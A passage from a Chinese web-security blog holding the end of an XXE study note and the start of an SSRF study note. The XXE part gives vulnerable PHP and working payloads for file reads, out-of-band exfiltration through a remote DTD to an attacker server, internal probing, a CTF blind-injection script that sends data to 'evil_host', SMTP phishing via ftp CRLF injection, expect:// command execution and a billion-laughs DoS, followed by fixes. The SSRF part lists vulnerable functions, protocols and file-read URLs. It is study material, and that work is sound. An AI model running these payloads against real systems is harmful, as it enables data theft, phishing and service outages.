title="4.1有回显的文件读取"></a>4.1有回显的文件读取</h3><p>实例代码:</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">libxml_disable_entity_loader</span> <span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input');</span><span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dom</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token constant">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token constant">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$creds</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>payload:</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [  &lt;!ENTITY goodies SYSTEM &quot;file:///c:/test.txt&quot;&gt; ]&gt; &lt;creds&gt;&amp;goodies;&lt;/creds&gt;</code></pre><p>可以看到成功读取<br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200328024529.png" alt></p><h3 id="4-2无回显的文件读取"><a href="#4-2无回显的文件读取" class="headerlink" title="4.2无回显的文件读取"></a>4.2无回显的文件读取</h3><p>正常环境当中很少会有回显,而面对没有回显的情况,我们要如何去获得读取的内容?<br>首先想到的是把数据外带出来,如何外带,首先就是实体,其本身就是一个请求,而如果我们请求的同时带上我们的数据,就可在vps中获取,这就要两次请求,一次请求来获取我们的数据,另一次请求来传送我们的数据到vps,这就要用到参数实体来进行实体引用.</p><p>测试代码:</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">libxml_disable_entity_loader</span> <span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input');</span><span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dom</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token constant">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token constant">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>test.dtd</p><pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///C:/test.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://ip:10888?p=%file;&#39;&gt;&quot;&gt;</code></pre><p>%要进行HTML编码,因为实体当中不能有%(具体参考上面),文件进行base64也是也是同理<br>payload</p><pre><code>&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;%remote;%int;%send;]&gt;</code></pre><p>成功获取数据:<br><img src="/3842592324/1.png" alt></p><p>调用过程:<br>首先要知道XML中的实体调用的规律,先调用DTD中的在调用XML中的,切严格按照先后顺序,存在内部直接调用实体就先执行(个人总结),这样看就很清楚,首先调用remote,去加载vps上的test.dtd然后调用里面的int实体化send,继续,sent直接调用了file,调用完之后回头payload中的顺序,在调用send将其发送到我们的vps上</p><p>其实还有一种是基于错误的XXE,就不演示了</p><h3 id="4-3-内网探测"><a href="#4-3-内网探测" class="headerlink" title="4.3 内网探测"></a>4.3 内网探测</h3><p>可以看到xml的URI其实支持很多协议,这就让我们的攻击面进行了扩大,姿势变得更多,尤其是java,可支持gophar这个万能协议,这里稍微演示一下,了解就好</p><p>内网探测很简单,利用协议发包看有没有回显就好,有的师傅已经写成脚本了<br>我这里主要就写个demo测试下</p><pre class=" language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE convert [ &lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://ip/"></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>test</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>test</span><span class="token punctuation">></span></span></code></pre><p>端口的话可以这样:</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>  <span class="token doctype">&lt;!DOCTYPE data SYSTEM "http://127.0.0.1:XX/" [  &lt;!ELEMENT data (#PCDATA)></span>  ]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>data</span><span class="token punctuation">></span></span>4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>data</span><span class="token punctuation">></span></span></code></pre><p><img src="/3842592324/2.png" alt><br>其实都可以用来两者是一样的,也可换过来用,当然,测试的场景很简单,更多的是提供个思路,真实环境中的利用还需要多思考.</p><h3 id="4-4-内网盲注"><a href="#4-4-内网盲注" class="headerlink" title="4.4 内网盲注"></a>4.4 内网盲注</h3><p>是强网杯的题目,脚本附一下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://39.107.33.75:33899/common.php'</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>result <span class="token operator">=</span> <span class="token string">''</span>data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"evil_man"</span><span class="token punctuation">,</span>        <span class="token string">"email"</span><span class="token punctuation">:</span><span class="token string">"testabcdefg@gmail.com"</span><span class="token punctuation">,</span>        <span class="token string">"comment"</span><span class="token punctuation">:</span><span class="token triple-quoted-string string">"""&lt;?xml version="1.0" encoding="utf-8"?>                &lt;!DOCTYPE root [                &lt;!ENTITY % dtd SYSTEM "http://evil_host/evil.dtd">                %dtd;]>                """</span><span class="token punctuation">}</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'./evil.dtd'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span>            payload2 <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;!ENTITY % file SYSTEM "php://filter/read=zlib.deflate/convert.base64-encode/resource=http://192.168.223.18/test.php?shop=3'-(case%a0when((select%a0group_concat(total)%a0from%a0albert_shop)like%a0binary('{}'))then(0)else(1)end)-'1">                &lt;!ENTITY % all "&lt;!ENTITY % send SYSTEM 'http://evil_host/?result=%file;'>">                %all;                %send;"""</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token string">'_'</span><span class="token operator">*</span>i<span class="token operator">+</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'_'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">27</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>                f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">print</span> <span class="token string">'test {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>                r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token string">"Oti3a3LeLPdkPkqKF84xs="</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>content <span class="token operator">and</span> chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token string">'_'</span><span class="token punctuation">:</span>                        result <span class="token operator">+=</span> chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span>                        <span class="token keyword">print</span> chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span>                        <span class="token keyword">break</span><span class="token keyword">print</span> result</code></pre><h3 id="4-5文件上传"><a href="#4-5文件上传" class="headerlink" title="4.5文件上传"></a>4.5文件上传</h3><p>这其实是k0rz3n师傅出的一道题目里面的思路<a href="https://www.k0rz3n.com/2018/11/19/LCTF%202018%20T4lk%201s%20ch34p,sh0w%20m3%20the%20sh31l%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/#0X01-%E8%AF%B4%E4%B8%80%E4%B8%8B%E6%83%B3%E8%A6%81%E8%80%83%E5%AF%9F%E7%9A%84%E7%82%B9" target="_blank" rel="noopener">LCTF 2018 T4lk 1s ch34p,sh0w m3 the sh31l 详细分析</a><br>这里主要提一下jar://协议<br>jar://协议</p><pre><code>jar:{url}!{path}</code></pre><p>使用:</p><pre><code>jar:http://host/application.jar!/file/within/the/zip</code></pre><p>和php中的phar类似,但是phar://不能加载远程文件<br>jar 协议处理文件的过程：</p><ol><li>下载 jar/zip 文件到临时文件中</li><li>提取出我们指定的文件</li><li>删除临时文件</li></ol><p>有点类似于条件竞争,需要考虑如何获取文件的路径,以及如何延长存在的时间,还需要一个包含来利用</p><h3 id="4-6邮件伪造"><a href="#4-6邮件伪造" class="headerlink" title="4.6邮件伪造"></a>4.6邮件伪造</h3><p>若是内网存在一台易受攻击的SMTP服务器,就能利用ftp://协议结合CRLF注入向其发送任意命令,可以由此可以进行邮件伪造,造成钓鱼<br>原理:</p><blockquote><p>Java支持在sun.net.ftp.impl.FtpClient中的ftp URI。因此，我们可以指定用户名和密码，例如ftp://user:password@host:port/XXX.txt，FTP客户端将在连接中发送相应的USER命令。<br>但是如果我们将%0D%0A (CRLF)添加到URL的user部分的任意位置，我们就可以终止USER命令并向FTP会话中注入一个新的命令，即允许我们向25端口发送任意的SMTP命令：</p></blockquote><p>demo:</p><pre><code>ftp://aEHLO aMAIL FROM: &lt;support@VULNERABLESYSTEM.com&gt;RCPT TO: &lt;victim@gmail.com&gt;DATAFrom: support@VULNERABLESYSTEM.comTo: victim@gmail.comSubject: Reset your passwordWe need to confirm your identity. Confirm your password here: http://PHISHING_URL.com.QUIT:support@VULNERABLESYSTEM.com:25</code></pre><h3 id="4-7-php-expect-RCE"><a href="#4-7-php-expect-RCE" class="headerlink" title="4.7 php expect RCE"></a>4.7 php expect RCE</h3><p>需要expect扩展<br>demo:</p><pre class=" language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM "expect://id"></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dir</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>file</span><span class="token punctuation">></span></span><span class="token entity" title="&cmd;">&amp;cmd;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>file</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dir</span><span class="token punctuation">></span></span></code></pre><h3 id="4-8-DOS"><a href="#4-8-DOS" class="headerlink" title="4.8 DOS"></a>4.8 DOS</h3><p>demo:</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>     <span class="token doctype">&lt;!DOCTYPE lolz [     &lt;!ENTITY lol "lol"></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol2</span> <span class="token attr-name">"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol3</span> <span class="token attr-name">"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol4</span> <span class="token attr-name">"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol5</span> <span class="token attr-name">"&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol6</span> <span class="token attr-name">"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol7</span> <span class="token attr-name">"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol8</span> <span class="token attr-name">"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol9</span> <span class="token attr-name">"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"</span><span class="token punctuation">></span></span>     ]>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lolz</span><span class="token punctuation">></span></span><span class="token entity" title="&lol9;">&amp;lol9;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lolz</span><span class="token punctuation">></span></span></code></pre><h2 id="0x05-判断XXE漏洞是否存在"><a href="#0x05-判断XXE漏洞是否存在" class="headerlink" title="0x05 判断XXE漏洞是否存在"></a>0x05 判断XXE漏洞是否存在</h2><ol><li>content-type: application/xml 这种就可以试试,也可以自己把content-type进行测试,有时候json接口也有可能会配有解析xml的接口</li><li>传送XML是否被解析</li><li>解析后探测是否支持外部实体<br>……</li></ol><h2 id="0x06漏洞修复"><a href="#0x06漏洞修复" class="headerlink" title="0x06漏洞修复"></a>0x06漏洞修复</h2><p>直接附上师傅们的总结:</p><h3 id="6-1禁用外部实体"><a href="#6-1禁用外部实体" class="headerlink" title="6.1禁用外部实体"></a>6.1禁用外部实体</h3><p>PHP：</p><blockquote><p>libxml_disable_entity_loader(true);</p></blockquote><p>JAVA:</p><blockquote><p>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();<br>dbf.setExpandEntityReferences(false);<br>.setFeature(“<a href="http://apache.org/xml/features/disallow-doctype-decl&quot;,true" target="_blank" rel="noopener">http://apache.org/xml/features/disallow-doctype-decl&quot;,true</a>);<br>.setFeature(“<a href="http://xml.org/sax/features/external-general-entities&quot;,false" target="_blank" rel="noopener">http://xml.org/sax/features/external-general-entities&quot;,false</a>)<br>.setFeature(“<a href="http://xml.org/sax/features/external-parameter-entities&quot;,false" target="_blank" rel="noopener">http://xml.org/sax/features/external-parameter-entities&quot;,false</a>);</p></blockquote><p>Python：</p><blockquote><p>from lxml import etree<br>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p></blockquote><h3 id="6-2-黑名单过滤"><a href="#6-2-黑名单过滤" class="headerlink" title="6.2 黑名单过滤"></a>6.2 黑名单过滤</h3><p>过滤:</p><pre><code>&lt;!DOCTYPE、&lt;!ENTITY、SYSTEM、PUBLIC</code></pre><h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>这次xxe学习属实是丰富了一波自己的知识储备,在此之前XXE对我来说是一片空白,是属于有点鸡肋的漏洞,远远不如SQL,RCE等,这些天通过ssrf和xxe发现,由于协议的支持,这些漏洞虽然达不到超越上面这些漏洞程度,但是可以比肩,确实是没有那种类型的漏洞是鸡肋的,只不过是自己发掘不出来罢了.十分认可k0rz3n师傅的在文章提的一句话</p><blockquote><p>你的知识面,决定着你的攻击面</p></blockquote><h2 id="0x08-PS-思维导图"><a href="#0x08-PS-思维导图" class="headerlink" title="0x08 PS:思维导图"></a>0x08 PS:思维导图</h2><p>自己画了个思维导图,主要是php方面,java不熟悉……<br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200328172331.png" alt></p><h2 id="0x09-参考文章"><a href="#0x09-参考文章" class="headerlink" title="0x09 参考文章"></a>0x09 参考文章</h2><p><a href="https://xz.aliyun.com/t/3357#toc-15" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-15</a><br><a href="https://xz.aliyun.com/t/6754#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/6754#toc-8</a><br><a href="https://www.cnblogs.com/backlion/p/9302528.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/9302528.html</a><br><a href="http://rui0.cn/archives/993" target="_blank" rel="noopener">http://rui0.cn/archives/993</a><br><a href="https://thief.one/2017/06/20/1/" target="_blank" rel="noopener">https://thief.one/2017/06/20/1/</a><br><a href="https://www.smi1e.top/dsada/" target="_blank" rel="noopener">https://www.smi1e.top/dsada/</a><br><a href="https://hpdoger.cn/2019/01/07/%E4%BB%8E%E4%B8%A4%E9%81%93CTF%E9%A2%98%E7%9B%AE%E5%AD%A6%E4%B9%A0XXE%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://hpdoger.cn/2019/01/07/%E4%BB%8E%E4%B8%A4%E9%81%93CTF%E9%A2%98%E7%9B%AE%E5%AD%A6%E4%B9%A0XXE%E6%BC%8F%E6%B4%9E/</a><br><a href="https://myzxcg.github.io/20171106.html" target="_blank" rel="noopener">https://myzxcg.github.io/20171106.html</a></p><hr><p>版权声明：</p><p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> XXE漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssrf学习笔记</title>
      <link href="/3755095433.html"/>
      <url>/3755095433.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>这是一篇菜鸟web手的ssrf学习笔记，有关ssrf的知识都会放在这里，持续更新ing……</p><h2 id="0x02-漏洞介绍"><a href="#0x02-漏洞介绍" class="headerlink" title="0x02 漏洞介绍"></a>0x02 漏洞介绍</h2><p>SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。</p><p>漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。</p><h2 id="0x03-漏洞函数"><a href="#0x03-漏洞函数" class="headerlink" title="0x03 漏洞函数"></a>0x03 漏洞函数</h2><p>ssrf有三种类型，分别是由<code>curl_exec()、file_get_contens（）、fsockopen()</code>漏洞的基本形式如下</p><p>curl_exec():</p><pre class=" language-php"><code class="language-php"><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>file_get_contents():</p><pre class=" language-php"><code class="language-php">     <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>fsockopen()：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">GetFile</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span><span class="token variable">$port</span><span class="token punctuation">,</span><span class="token variable">$link</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$port</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fp</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token string">"$errstr (error number $errno) \n"</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">else</span>     <span class="token punctuation">{</span>         <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token string">"GET $link HTTP/1.1\r\n"</span><span class="token punctuation">;</span>         <span class="token variable">$out</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"Host: $host\r\n"</span><span class="token punctuation">;</span>         <span class="token variable">$out</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"Connection: Close\r\n\r\n"</span><span class="token punctuation">;</span>         <span class="token variable">$out</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"\r\n"</span><span class="token punctuation">;</span>         <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token variable">$out</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$contents</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>         <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span>         <span class="token punctuation">{</span>             <span class="token variable">$contents</span><span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">return</span> <span class="token variable">$contents</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span></code></pre><h2 id="0x04-可利用协议"><a href="#0x04-可利用协议" class="headerlink" title="0x04 可利用协议"></a>0x04 可利用协议</h2><p>ssrf的危害大多是来自于其对于各种协议的支持，其中以curl_exec为最，几乎支持各种协议，其次是file_get_contens，最后的fsockopen几乎就不支持仍和协议了。</p><p>先附上一波各语言ssrf可以利用的协议：<br><img src="/3755095433/8.jpg" alt></p><p>从图中也可以看出curl支持的协议是最多的，而php其次，但是php仍带有一些封装协议可以利用。需要提一下windows可利用的curl协议要比linux少很多。本地测试的不一定对，gopher就不支持</p><p>最为常见的协议为下面这些</p><blockquote><p> file://        //File协议⽤于访问本地⽂件<br> http://  https://        //http和https⽤于访问互联⽹⽂件<br> dict://        //dict协议是⼀个字典服务器协议，<br> gopher://        //ssrf中的最强协议，其最⼤优点就在于可以发送各种格式的请求。<br> smtp://  pop3://  imap://        //常⻅的邮件协议 ，可以用来爆破邮件的用户名和密码<br> ftp://  tftp://        //⽂件传输协议，若有未授权则可以直接读取⽂件 ，也可爆破<br> php://        //⽤php伪协议可读取⽂件<br> phar://        //触发反序列化</p></blockquote><p>协议这方面触及的不多，可能会单独写文章进行总结，gopher肯定是要详细谢谢的，太强大了</p><h2 id="0x05-漏洞利用"><a href="#0x05-漏洞利用" class="headerlink" title="0x05 漏洞利用"></a>0x05 漏洞利用</h2><p>ssrf利用面是真的广，基本什么都能做，大题为下面三类</p><h3 id="6-1-内网应用攻击"><a href="#6-1-内网应用攻击" class="headerlink" title="6.1 内网应用攻击"></a>6.1 内网应用攻击</h3><p>内网攻击算是ssrf最NP的地方了，其中最出名的就是ssrf配合redis数据库getshell，多是利用gopher协议，由于篇幅我会在gopher里面详解。<br>其次就是内网服务探测了，主要是利用<code>dict://、ftp://、http://、telnet://</code>等协议尽心探测</p><h3 id="6-2-任意文件读取"><a href="#6-2-任意文件读取" class="headerlink" title="6.2 任意文件读取"></a>6.2 任意文件读取</h3><p>SSRF其实也可以分为有无回显两种，在文件读取这个地方提一下，文件读取就是file://协议了</p><h4 id="6-2-1有回显"><a href="#6-2-1有回显" class="headerlink" title="6.2.1有回显"></a>6.2.1有回显</h4><h5 id="6-2-1-1-完全回显SSRF"><a href="#6-2-1-1-完全回显SSRF" class="headerlink" title="6.2.1.1 完全回显SSRF"></a>6.2.1.1 完全回显SSRF</h5><p>直接利用请求，然后根据回显判断<br><code>http://localhost/ssrf.php?url=file:///etc/passwd</code><br><code>http://localhost.com/ssrf.php?url=file:///C:/Windows/win.ini</code><br>其他协议利用方式：</p><pre><code>gophergopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流http://127.0.0.1/ssrf.php?url=gopher://127.0.0.1:2333/_testdicthttp://127.0.0.1/ssrf.php?url=dict://127.0.0.1:port/infohttphttp://127.0.0.1/ssrf.php?url=http://xxx.com/302.php</code></pre><p>直接根据回显内容和状态判读即可</p><h5 id="6-2-1-2BOOL型ssrf"><a href="#6-2-1-2BOOL型ssrf" class="headerlink" title="6.2.1.2BOOL型ssrf"></a>6.2.1.2BOOL型ssrf</h5><p>上面的会完整的显示回显信息，但是还以一种则只会返回True or False。这种要想读取文件就需要考虑OOB了，目前木的思路，感觉可行性不高。仍可进行内网探测与攻击……</p><p>需要注意的是即使返回true，payload也不一定执行成功。</p><h4 id="6-3-2无回显"><a href="#6-3-2无回显" class="headerlink" title="6.3.2无回显"></a>6.3.2无回显</h4><p>无回显就只能通过在vps上通过监听，进行测试，对于无回显无法判断命令是否执行成功，只能进行探测。可以先测一波协议，再从一些协议上下手，搞出来回显。或者直接尝试攻击……</p><h3 id="6-3-Dos"><a href="#6-3-Dos" class="headerlink" title="6.3 Dos"></a>6.3 Dos</h3><p>请求大文件，始终保持连接Keep-Alive Always</p><h2 id="0x06-漏洞常见的出现场景"><a href="#0x06-漏洞常见的出现场景" class="headerlink" title="0x06 漏洞常见的出现场景"></a>0x06 